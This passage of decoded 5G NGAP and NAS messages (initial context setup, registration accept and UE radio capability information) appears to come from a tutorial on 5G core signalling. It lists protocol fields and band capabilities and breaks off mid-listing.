id: id-CoreNetworkAssistanceInformationForInactive (18) criticality: ignore (1) value CoreNetworkAssistanceInformationForInactive uEIdentityIndexValue: indexLength10 (0) indexLength10: 7200 [bit length 10, 6 LSB pad bits, 0111 0010 00.. .... decimal value 456] periodicRegistrationUpdateTimer: 0 sec (96) tAIListForInactive: 1 item Item 0 TAIListForInactiveItem tAI pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) tAC: 4388 (0x001124) Item 4: id-GUAMI ProtocolIE-Field id: id-GUAMI (28) criticality: reject (0) value GUAMI pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) aMFRegionID: 02 [bit length 8, 0000 0010 decimal value 2] aMFSetID: 0080 [bit length 10, 6 LSB pad bits, 0000 0000 10.. .... decimal value 2] aMFPointer: 20 [bit length 6, 2 LSB pad bits, 0010 00.. decimal value 8] Item 5: id-AllowedNSSAI ProtocolIE-Field id: id-AllowedNSSAI (0) criticality: reject (0) value AllowedNSSAI: 1 item Item 0 AllowedNSSAI-Item s-NSSAI sST: 01 sD: 000001 Item 6: id-UESecurityCapabilities ProtocolIE-Field id: id-UESecurityCapabilities (119) criticality: reject (0) value UESecurityCapabilities nRencryptionAlgorithms: e000 [bit length 16, 1110 0000 0000 0000 decimal value 57344] 1... .... .... .... = 128-NEA1: Supported .1.. .... .... .... = 128-NEA2: Supported ..1. .... .... .... = 128-NEA3: Supported ...0 0000 0000 0000 = Reserved: 0x0000 nRintegrityProtectionAlgorithms: e000 [bit length 16, 1110 0000 0000 0000 decimal value 57344] 1... .... .... .... = 128-NIA1: Supported .1.. .... .... .... = 128-NIA2: Supported ..1. .... .... .... = 128-NIA3: Supported ...0 0000 0000 0000 = Reserved: 0x0000 eUTRAencryptionAlgorithms: 0000 [bit length 16, 0000 0000 0000 0000 decimal value 0] 0... .... .... .... = 128-EEA1: Not supported .0.. .... .... .... = 128-EEA2: Not supported ..0. .... .... .... = 128-EEA3: Not supported ...0 0000 0000 0000 = Reserved: 0x0000 eUTRAintegrityProtectionAlgorithms: 0000 [bit length 16, 0000 0000 0000 0000 decimal value 0] 0... .... .... .... = 128-EIA1: Not supported .0.. .... .... .... = 128-EIA2: Not supported ..0. .... .... .... = 128-EIA3: Not supported ...0 0000 0000 0000 = Reserved: 0x0000 Item 7: id-SecurityKey ProtocolIE-Field id: id-SecurityKey (94) criticality: reject (0) value SecurityKey: f712ad9fc4f3cbd91bdf25d72e9a18643be1ae6ee397e209… [bit length 256] Item 8: id-MobilityRestrictionList ProtocolIE-Field id: id-MobilityRestrictionList (36) criticality: ignore (1) value MobilityRestrictionList servingPLMN: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) rATRestrictions: 1 item Item 0 RATRestrictions-Item pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) rATRestrictionInformation: 00 [bit length 8, 0000 0000 decimal value 0] 0... .... = e-UTRA: Not restricted .0.. .... = nR: Not restricted ..00 0000 = reserved: 0x00 serviceAreaInformation: 1 item Item 0 ServiceAreaInformation-Item pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) allowedTACs: 2 items Item 0 TAC: 4386 (0x001122) Item 1 TAC: 4388 (0x001124) iE-Extensions: 1 item Item 0 ProtocolExtensionField id: id-CNTypeRestrictionsForServing (161) criticality: ignore (1) extensionValue CNTypeRestrictionsForServing: epc-forbidden (0) Item 9: id-IndexToRFSP ProtocolIE-Field id: id-IndexToRFSP (31) criticality: ignore (1) value IndexToRFSP: 8 Item 10: id-NAS-PDU ProtocolIE-Field id: id-NAS-PDU (38) criticality: ignore (1) value NAS-PDU: 7e02af04712c017e0042010177000bf264f0000200880040… Non-Access-Stratum 5GS (NAS)PDU Security protected NAS 5GS message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0010 = Security header type: Integrity protected and ciphered (2) Message authentication code: 0xaf04712c Sequence number: 1 Plain NAS 5GS Message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0000 = Security header type: Plain NAS message, not security protected (0) Message type: Registration accept (0x42) 5GS registration result Length: 1 ...0 .... = NSSAA Performed: False .... 0... = SMS over NAS: Not Allowed .... .001 = 5GS registration result: 3GPP access (1) 5GS mobile identity - 5G-GUTI Element ID: 0x77 Length: 11 .... 0... = Odd/even indication: Even number of identity digits .... .010 = Type of identity: 5G-GUTI (2) Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) AMF Region ID: 2 0000 0000 10.. .... = AMF Set ID: 2 ..00 1000 = AMF Pointer: 8 5G-TMSI: 0x004001c8 5GS tracking area identity list Element ID: 0x54 Length: 7 Partial tracking area list 1 .01. .... = Type of list: list of TACs belonging to one PLMN, with consecutive TAC values (1) ...0 0000 = Number of elements: 1 element (0) Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) TAC: 4388 NSSAI - Allowed NSSAI Element ID: 0x15 Length: 5 S-NSSAI 1 Length: 4 Slice/service type (SST): 1 Slice differentiator (SD): 1 5GS network feature support Element ID: 0x21 Length: 2 0... .... = MPS indicator (MPSI): Access identity 1 not valid in RPLMN or equivalent PLMN .0.. .... = Interworking without N26: Not supported ..00 .... = Emergency service fallback indicator (EMF): Emergency services fallback not supported (0) .... 00.. = Emergency service support indicator (EMC): Emergency services not supported (0) .... ..0. = IMS voice over PS session over non-3GPP access indicator (IMS-VoPS-N3GPP): Not supported .... ...1 = IMS voice over PS session indicator (IMS VoPS): Supported 0... .... = Spare: 0 .0.. .... = Spare: 0 ..0. .... = Spare: 0 ...0 .... = Spare: 0 .... 0... = Spare: 0 .... .0.. = Spare: 0 .... ..0. = MCS indicator (MCSI): Not supported .... ...0 = Emergency services over non-3GPP access (EMCN3): Not supported LADN information Element ID: 0x79 Length: 36 LADN 1 Length: 6 DNN: cmnet Length: 28 Partial tracking area list 1 .00. .... = Type of list: list of TACs belonging to one PLMN, with non-consecutive TAC values (0) ...0 0111 = Number of elements: 8 elements (7) Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) TAC: 4386 TAC: 4388 TAC: 4387 TAC: 4384 TAC: 4385 TAC: 4381 TAC: 4382 TAC: 4383 Service area list GPRS Timer 3 - T3512 value Element ID: 0x5e Length: 1 GPRS Timer: 0 sec 011. .... = Unit: value is incremented in multiples of 2 seconds (3) ...0 0000 = Timer value: 0 2.7 InitialContextSetupResponse1234567891011121314151617181920NG Application Protocol NGAP-PDU: successfulOutcome (1) successfulOutcome procedureCode: id-InitialContextSetup (14) criticality: reject (0) value InitialContextSetupResponse protocolIEs: 2 items Item 0: id-AMF-UE-NGAP-ID ProtocolIE-Field id: id-AMF-UE-NGAP-ID (10) criticality: ignore (1) value AMF-UE-NGAP-ID: 9 Item 1: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: ignore (1) value RAN-UE-NGAP-ID: 13 2.8 UERadioAccessCapabilityInformation123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720NGAP-PDU: initiatingMessage (0) initiatingMessage procedureCode: id-UERadioCapabilityInfoIndication (44) criticality: ignore (1) value UERadioCapabilityInfoIndication protocolIEs: 3 items Item 0: id-AMF-UE-NGAP-ID ProtocolIE-Field id: id-AMF-UE-NGAP-ID (10) criticality: reject (0) value AMF-UE-NGAP-ID: 2155872278 Item 1: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: reject (0) value RAN-UE-NGAP-ID: 4194571 Item 2: id-UERadioCapability ProtocolIE-Field id: id-UERadioCapability (117) criticality: ignore (1) value UERadioCapability: 040b5888168e1a0000007465a031e000380a03c1260c0000… UERadioAccessCapabilityInformation criticalExtensions: c1 (0) c1: ueRadioAccessCapabilityInformation (0) ueRadioAccessCapabilityInformation ue-RadioAccessCapabilityInfo: 1102d1c34000000e8cb4063c000701407824c1800010f010… UE-CapabilityRAT-ContainerList: 1 item Item 0 UE-CapabilityRAT-Container rat-Type: nr (0) ue-CapabilityRAT-Container: e1a0000007465a031e000380a03c1260c000087808188068… UE-NR-Capability accessStratumRelease: rel15 (0) pdcp-Parameters supportedROHC-Profiles .... ..0. profile0x0000: False .... ...0 profile0x0001: False 0... .... profile0x0002: False .0.. .... profile0x0003: False ..0. .... profile0x0004: False ...0 .... profile0x0006: False .... 0... profile0x0101: False .... .0.. profile0x0102: False .... ..0. profile0x0103: False .... ...0 profile0x0104: False maxNumberROHC-ContextSessions: cs2 (0) rlc-Parameters am-WithShortSN: supported (0) um-WithShortSN: supported (0) um-WithLongSN: supported (0) mac-Parameters mac-ParametersXDD-Diff longDRX-Cycle: supported (0) shortDRX-Cycle: supported (0) phy-Parameters phy-ParametersCommon dynamicHARQ-ACK-Codebook: supported (0) semiStaticHARQ-ACK-Codebook: supported (0) ra-Type0-PUSCH: supported (0) dynamicSwitchRA-Type0-1-PDSCH: supported (0) dynamicSwitchRA-Type0-1-PUSCH: supported (0) pdsch-MappingTypeA: supported (0) rateMatchingResrcSetSemi-Static: supported (0) rateMatchingResrcSetDynamic: supported (0) bwp-SwitchingDelay: type1 (0) maxNumberSearchSpaces: n10 (0) rateMatchingCtrlResrcSetDynamic: supported (0) maxLayersMIMO-Indication: supported (0) phy-ParametersFRX-Diff twoFL-DMRS: c0 [bit length 2, 6 LSB pad bits, 11.. .... decimal value 3] supportedDMRS-TypeDL: type1And2 (1) supportedDMRS-TypeUL: type1And2 (1) pucch-F2-WithFH: supported (0) pucch-F3-WithFH: supported (0) almostContiguousCP-OFDM-UL: supported (0) mux-SR-HARQ-ACK-CSI-PUCCH-OncePerSlot sameSymbol: supported (0) oneFL-DMRS-TwoAdditionalDMRS-UL: supported (0) twoFL-DMRS-TwoAdditionalDMRS-UL: supported (0) phy-ParametersFR1 pdsch-256QAM-FR1: supported (0) pdsch-RE-MappingFR1-PerSymbol: n10 (0) pdsch-RE-MappingFR1-PerSlot: n16 (0) rf-Parameters supportedBandListNR: 7 items Item 0 BandNR bandNR: 1 mimo-ParametersPerBand tci-StatePDSCH maxNumberConfiguredTCIstatesPerCC: n16 (2) maxNumberActiveTCI-PerBWP: n1 (0) pusch-TransCoherence: nonCoherent (0) periodicBeamReport: supported (0) aperiodicBeamReport: supported (0) maxNumberNonGroupBeamReporting: n1 (0) dummy5 maxNumberAperiodicSRS-PerBWP: n16 (4) maxNumberAperiodicSRS-PerBWP-PerSlot: 6 maxNumberPeriodicSRS-PerBWP: n16 (4) maxNumberPeriodicSRS-PerBWP-PerSlot: 6 maxNumberSemiPersistentSRS-PerBWP: n16 (4) maxNumberSemiPersistentSRS-PerBWP-PerSlot: 6 maxNumberSRS-Ports-PerResource: n1 (0) beamManagementSSB-CSI-RS maxNumberSSB-CSI-RS-ResourceOneTx: n8 (1) maxNumberCSI-RS-Resource: n0 (0) maxNumberCSI-RS-ResourceTwoTx: n0 (0) maxNumberAperiodicCSI-RS-Resource: n4 (2) codebookParameters type1 singlePanel supportedCSI-RS-ResourceList: 1 item Item 0 SupportedCSI-RS-Resource maxNumberTxPortsPerResource: p16 (4) maxNumberResourcesPerBand: 8 totalNumberTxPortsPerBand: 16 modes: mode1andMode2 (1) maxNumberCSI-RS-PerResourceSet: 8 csi-RS-IM-ReceptionForFeedback maxConfigNumberNZP-CSI-RS-PerCC: 8 maxConfigNumberPortsAcrossNZP-CSI-RS-PerCC: 16 maxConfigNumberCSI-IM-PerCC: n4 (2) maxNumberSimultaneousNZP-CSI-RS-PerCC: 4 totalNumberPortsSimultaneousNZP-CSI-RS-PerCC: 16 csi-ReportFramework maxNumberPeriodicCSI-PerBWP-ForCSI-Report: 1 maxNumberAperiodicCSI-PerBWP-ForCSI-Report: 1 maxNumberSemiPersistentCSI-PerBWP-ForCSI-Report: 0 maxNumberPeriodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-triggeringStatePerCC: n15 (2) maxNumberSemiPersistentCSI-PerBWP-ForBeamReport: 0 simultaneousCSI-ReportsPerCC: 2 csi-RS-ForTracking maxBurstLength: 2 maxSimultaneousResourceSetsPerCC: 2 maxConfiguredResourceSetsPerCC: 16 maxConfiguredResourceSetsAllCC: 32 multipleTCI: supported (0) bwp-SameNumerology: upto4 (1) pusch-256QAM: supported (0) channelBWs-DL-v1530: fr1 (0) fr1 scs-30kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] scs-60kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] channelBWs-UL-v1530: fr1 (0) fr1 scs-30kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] scs-60kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] Item 1 BandNR bandNR: 3 mimo-ParametersPerBand tci-StatePDSCH maxNumberConfiguredTCIstatesPerCC: n16 (2) maxNumberActiveTCI-PerBWP: n1 (0) pusch-TransCoherence: nonCoherent (0) periodicBeamReport: supported (0) aperiodicBeamReport: supported (0) maxNumberNonGroupBeamReporting: n1 (0) dummy5 maxNumberAperiodicSRS-PerBWP: n16 (4) maxNumberAperiodicSRS-PerBWP-PerSlot: 6 maxNumberPeriodicSRS-PerBWP: n16 (4) maxNumberPeriodicSRS-PerBWP-PerSlot: 6 maxNumberSemiPersistentSRS-PerBWP: n16 (4) maxNumberSemiPersistentSRS-PerBWP-PerSlot: 6 maxNumberSRS-Ports-PerResource: n1 (0) beamManagementSSB-CSI-RS maxNumberSSB-CSI-RS-ResourceOneTx: n8 (1) maxNumberCSI-RS-Resource: n0 (0) maxNumberCSI-RS-ResourceTwoTx: n0 (0) maxNumberAperiodicCSI-RS-Resource: n4 (2) codebookParameters type1 singlePanel supportedCSI-RS-ResourceList: 1 item Item 0 SupportedCSI-RS-Resource maxNumberTxPortsPerResource: p16 (4) maxNumberResourcesPerBand: 8 totalNumberTxPortsPerBand: 16 modes: mode1andMode2 (1) maxNumberCSI-RS-PerResourceSet: 8 csi-RS-IM-ReceptionForFeedback maxConfigNumberNZP-CSI-RS-PerCC: 8 maxConfigNumberPortsAcrossNZP-CSI-RS-PerCC: 16 maxConfigNumberCSI-IM-PerCC: n4 (2) maxNumberSimultaneousNZP-CSI-RS-PerCC: 4 totalNumberPortsSimultaneousNZP-CSI-RS-PerCC: 16 csi-ReportFramework maxNumberPeriodicCSI-PerBWP-ForCSI-Report: 1 maxNumberAperiodicCSI-PerBWP-ForCSI-Report: 1 maxNumberSemiPersistentCSI-PerBWP-ForCSI-Report: 0 maxNumberPeriodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-triggeringStatePerCC: n15 (2) maxNumberSemiPersistentCSI-PerBWP-ForBeamReport: 0 simultaneousCSI-ReportsPerCC: 2 csi-RS-ForTracking maxBurstLength: 2 maxSimultaneousResourceSetsPerCC: 2 maxConfiguredResourceSetsPerCC: 16 maxConfiguredResourceSetsAllCC: 32 multipleTCI: supported (0) bwp-SameNumerology: upto4 (1) pusch-256QAM: supported (0) channelBWs-DL-v1530: fr1 (0) fr1 scs-15kHz: f000 [bit length 10, 6 LSB pad bits, 1111 0000 00.. .... decimal value 960] scs-30kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] scs-60kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] channelBWs-UL-v1530: fr1 (0) fr1 scs-15kHz: f000 [bit length 10, 6 LSB pad bits, 1111 0000 00.. .... decimal value 960] scs-30kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] scs-60kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] Item 2 BandNR bandNR: 28 mimo-ParametersPerBand tci-StatePDSCH maxNumberConfiguredTCIstatesPerCC: n16 (2) maxNumberActiveTCI-PerBWP: n1 (0) pusch-TransCoherence: nonCoherent (0) periodicBeamReport: supported (0) aperiodicBeamReport: supported (0) maxNumberNonGroupBeamReporting: n1 (0) dummy5 maxNumberAperiodicSRS-PerBWP: n16 (4) maxNumberAperiodicSRS-PerBWP-PerSlot: 6 maxNumberPeriodicSRS-PerBWP: n16 (4) maxNumberPeriodicSRS-PerBWP-PerSlot: 6 maxNumberSemiPersistentSRS-PerBWP: n16 (4) maxNumberSemiPersistentSRS-PerBWP-PerSlot: 6 maxNumberSRS-Ports-PerResource: n1 (0) beamManagementSSB-CSI-RS maxNumberSSB-CSI-RS-ResourceOneTx: n8 (1) maxNumberCSI-RS-Resource: n0 (0) maxNumberCSI-RS-ResourceTwoTx: n0 (0) maxNumberAperiodicCSI-RS-Resource: n4 (2) codebookParameters type1 singlePanel supportedCSI-RS-ResourceList: 1 item Item 0 SupportedCSI-RS-Resource maxNumberTxPortsPerResource: p16 (4) maxNumberResourcesPerBand: 8 totalNumberTxPortsPerBand: 16 modes: mode1andMode2 (1) maxNumberCSI-RS-PerResourceSet: 8 csi-RS-IM-ReceptionForFeedback maxConfigNumberNZP-CSI-RS-PerCC: 8 maxConfigNumberPortsAcrossNZP-CSI-RS-PerCC: 16 maxConfigNumberCSI-IM-PerCC: n4 (2) maxNumberSimultaneousNZP-CSI-RS-PerCC: 4 totalNumberPortsSimultaneousNZP-CSI-RS-PerCC: 16 csi-ReportFramework maxNumberPeriodicCSI-PerBWP-ForCSI-Report: 1 maxNumberAperiodicCSI-PerBWP-ForCSI-Report: 1 maxNumberSemiPersistentCSI-PerBWP-ForCSI-Report: 0 maxNumberPeriodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-triggeringStatePerCC: n15 (2) maxNumberSemiPersistentCSI-PerBWP-ForBeamReport: 0 simultaneousCSI-ReportsPerCC: 2 csi-RS-ForTracking maxBurstLength: 2 maxSimultaneousResourceSetsPerCC: 2 maxConfiguredResourceSetsPerCC: 16 maxConfiguredResourceSetsAllCC: 32 multipleTCI: supported (0) bwp-SameNumerology: upto4 (1) pusch-256QAM: supported (0) channelBWs-DL-v1530: fr1 (0) fr1 scs-30kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] channelBWs-UL-v1530: fr1 (0) fr1 scs-30kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] Item 3 BandNR bandNR: 41 mimo-ParametersPerBand tci-StatePDSCH maxNumberConfiguredTCIstatesPerCC: n16 (2) maxNumberActiveTCI-PerBWP: n1 (0) pusch-TransCoherence: nonCoherent (0) periodicBeamReport: supported (0) aperiodicBeamReport: supported (0) maxNumberNonGroupBeamReporting: n1 (0) dummy5 maxNumberAperiodicSRS-PerBWP: n16 (4) maxNumberAperiodicSRS-PerBWP-PerSlot: 6 maxNumberPeriodicSRS-PerBWP: n16 (4) maxNumberPeriodicSRS-PerBWP-PerSlot: 6 maxNumberSemiPersistentSRS-PerBWP: n16 (4) maxNumberSemiPersistentSRS-PerBWP-PerSlot: 6 maxNumberSRS-Ports-PerResource: n1 (0) beamReportTiming scs-30kHz: sym28 (3) beamManagementSSB-CSI-RS maxNumberSSB-CSI-RS-ResourceOneTx: n8 (1) maxNumberCSI-RS-Resource: n0 (0) maxNumberCSI-RS-ResourceTwoTx: n0 (0) maxNumberAperiodicCSI-RS-Resource: n4 (2) codebookParameters type1 singlePanel supportedCSI-RS-ResourceList: 1 item Item 0 SupportedCSI-RS-Resource maxNumberTxPortsPerResource: p16 (4) maxNumberResourcesPerBand: 8 totalNumberTxPortsPerBand: 16 modes: mode1andMode2 (1) maxNumberCSI-RS-PerResourceSet: 8 csi-RS-IM-ReceptionForFeedback maxConfigNumberNZP-CSI-RS-PerCC: 8 maxConfigNumberPortsAcrossNZP-CSI-RS-PerCC: 16 maxConfigNumberCSI-IM-PerCC: n4 (2) maxNumberSimultaneousNZP-CSI-RS-PerCC: 4 totalNumberPortsSimultaneousNZP-CSI-RS-PerCC: 16 csi-ReportFramework maxNumberPeriodicCSI-PerBWP-ForCSI-Report: 1 maxNumberAperiodicCSI-PerBWP-ForCSI-Report: 1 maxNumberSemiPersistentCSI-PerBWP-ForCSI-Report: 0 maxNumberPeriodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-triggeringStatePerCC: n15 (2) maxNumberSemiPersistentCSI-PerBWP-ForBeamReport: 0 simultaneousCSI-ReportsPerCC: 2 csi-RS-ForTracking maxBurstLength: 2 maxSimultaneousResourceSetsPerCC: 2 maxConfiguredResourceSetsPerCC: 16 maxConfiguredResourceSetsAllCC: 32 multipleTCI: supported (0) bwp-SameNumerology: upto4 (1) pusch-256QAM: supported (0) ue-PowerClass: pc2 (1) channelBWs-DL-v1530: fr1 (0) fr1 scs-15kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] scs-30kHz: 13c0 [bit length 10, 6 LSB pad bits, 0001 0011 11.. .... decimal value 79] scs-60kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] channelBWs-UL-v1530: fr1 (0) fr1 scs-15kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] scs-30kHz: 13c0 [bit length 10, 6 LSB pad bits, 0001 0011 11.. .... decimal value 79] scs-60kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] Item 4 BandNR bandNR: 77 mimo-ParametersPerBand tci-StatePDSCH maxNumberConfiguredTCIstatesPerCC: n16 (2) maxNumberActiveTCI-PerBWP: n1 (0) pusch-TransCoherence: nonCoherent (0) periodicBeamReport: supported (0) aperiodicBeamReport: supported (0) maxNumberNonGroupBeamReporting: n1 (0) dummy5 maxNumberAperiodicSRS-PerBWP: n16 (4) maxNumberAperiodicSRS-PerBWP-PerSlot: 6 maxNumberPeriodicSRS-PerBWP: n16 (4) maxNumberPeriodicSRS-PerBWP-PerSlot: 6 maxNumberSemiPersistentSRS-PerBWP: n16 (4) maxNumberSemiPersistentSRS-PerBWP-PerSlot: 6 maxNumberSRS-Ports-PerResource: n1 (0) beamReportTiming scs-30kHz: sym28 (3) beamManagementSSB-CSI-RS maxNumberSSB-CSI-RS-ResourceOneTx: n8 (1) maxNumberCSI-RS-Resource: n0 (0) maxNumberCSI-RS-ResourceTwoTx: n0 (0) maxNumberAperiodicCSI-RS-Resource: n4 (2) codebookParameters type1 singlePanel supportedCSI-RS-ResourceList: 1 item Item 0 SupportedCSI-RS-Resource maxNumberTxPortsPerResource: p16 (4) maxNumberResourcesPerBand: 8 totalNumberTxPortsPerBand: 16 modes: mode1andMode2 (1) maxNumberCSI-RS-PerResourceSet: 8 csi-RS-IM-ReceptionForFeedback maxConfigNumberNZP-CSI-RS-PerCC: 8 maxConfigNumberPortsAcrossNZP-CSI-RS-PerCC: 16 maxConfigNumberCSI-IM-PerCC: n4 (2) maxNumberSimultaneousNZP-CSI-RS-PerCC: 4 totalNumberPortsSimultaneousNZP-CSI-RS-PerCC: 16 csi-ReportFramework maxNumberPeriodicCSI-PerBWP-ForCSI-Report: 1 maxNumberAperiodicCSI-PerBWP-ForCSI-Report: 1 maxNumberSemiPersistentCSI-PerBWP-ForCSI-Report: 0 maxNumberPeriodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-triggeringStatePerCC: n15 (2) maxNumberSemiPersistentCSI-PerBWP-ForBeamReport: 0 simultaneousCSI-ReportsPerCC: 2 csi-RS-ForTracking maxBurstLength: 2 maxSimultaneousResourceSetsPerCC: 2 maxConfiguredResourceSetsPerCC: 16 maxConfiguredResourceSetsAllCC: 32 multipleTCI: supported (0) bwp-SameNumerology: upto4 (1) pusch-256QAM: supported (0) ue-PowerClass: pc2 (1) channelBWs-DL-v1530: fr1 (0) fr1 scs-15kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] scs-30kHz: 13c0 [bit length 10, 6 LSB pad bits, 0001 0011 11.. .... decimal value 79] scs-60kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] channelBWs-UL-v1530: fr1 (0) fr1 scs-15kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] scs-30kHz: 13c0 [bit length 10, 6 LSB pad bits, 0001 0011 11.. .... decimal value 79] scs-60kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] Item 5 BandNR bandNR: 78 mimo-ParametersPerBand tci-StatePDSCH maxNumberConfiguredTCIstatesPerCC: n16 (2) maxNumberActiveTCI-PerBWP: n1 (0) pusch-TransCoherence: nonCoherent (0) periodicBeamReport: supported (0) aperiodicBeamReport: supported (0) maxNumberNonGroupBeamReporting: n1 (0) dummy5 maxNumberAperiodicSRS-PerBWP: n16 (4) maxNumberAperiodicSRS-PerBWP-PerSlot: 6 maxNumberPeriodicSRS-PerBWP: n16 (4) maxNumberPeriodicSRS-PerBWP-PerSlot: 6 maxNumberSemiPersistentSRS-PerBWP: n16 (4) maxNumberSemiPersistentSRS-PerBWP-PerSlot: 6 maxNumberSRS-Ports-PerResource: n1 (0) beamReportTiming scs-30kHz: sym28 (3) beamManagementSSB-CSI-RS maxNumberSSB-CSI-RS-ResourceOneTx: n8 (1) maxNumberCSI-RS-Resource: n0 (0) maxNumberCSI-RS-ResourceTwoTx: n0 (0) maxNumberAperiodicCSI-RS-Resource: n4 (2) codebookParameters type1 singlePanel supportedCSI-RS-ResourceList: 1 item Item 0 SupportedCSI-RS-Resource maxNumberTxPortsPerResource: p16 (4) maxNumberResourcesPerBand: 8 totalNumberTxPortsPerBand: 16 modes: mode1andMode2 (1) maxNumberCSI-RS-PerResourceSet: 8 csi-RS-IM-ReceptionForFeedback maxConfigNumberNZP-CSI-RS-PerCC: 8 maxConfigNumberPortsAcrossNZP-CSI-RS-PerCC: 16 maxConfigNumberCSI-IM-PerCC: n4 (2) maxNumberSimultaneousNZP-CSI-RS-PerCC: 4 totalNumberPortsSimultaneousNZP-CSI-RS-PerCC: 16 csi-ReportFramework maxNumberPeriodicCSI-PerBWP-ForCSI-Report: 1 maxNumberAperiodicCSI-PerBWP-ForCSI-Report: 1 maxNumberSemiPersistentCSI-PerBWP-ForCSI-Report: 0 maxNumberPeriodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-triggeringStatePerCC: n15 (2) maxNumberSemiPersistentCSI-PerBWP-ForBeamReport: 0 simultaneousCSI-ReportsPerCC: 2 csi-RS-ForTracking maxBurstLength: 2 maxSimultaneousResourceSetsPerCC: 2 maxConfiguredResourceSetsPerCC: 16 maxConfiguredResourceSetsAllCC: 32 multipleTCI: supported (0) bwp-SameNumerology: upto4 (1) pusch-256QAM: supported (0) ue-PowerClass: pc2 (1) channelBWs-DL-v1530: fr1 (0) fr1 scs-15kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] scs-30kHz: 13c0 [bit length 10, 6 LSB pad bits, 0001 0011 11.. .... decimal value 79] scs-60kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] channelBWs-UL-v1530: fr1 (0) fr1 scs-15kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] scs-30kHz: 13c0 [bit length 10, 6 LSB pad bits, 0001 0011 11.. .... decimal value 79] scs-60kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] Item 6 BandNR bandNR: 79 mimo-ParametersPerBand tci-StatePDSCH maxNumberConfiguredTCIstatesPerCC: n16 (2) maxNumberActiveTCI-PerBWP: n1 (0) pusch-TransCoherence: nonCoherent (0) periodicBeamReport: supported (0) aperiodicBeamReport: supported (0) maxNumberNonGroupBeamReporting: n1 (0) dummy5 maxNumberAperiodicSRS-PerBWP: n16 (4) maxNumberAperiodicSRS-PerBWP-PerSlot: 6 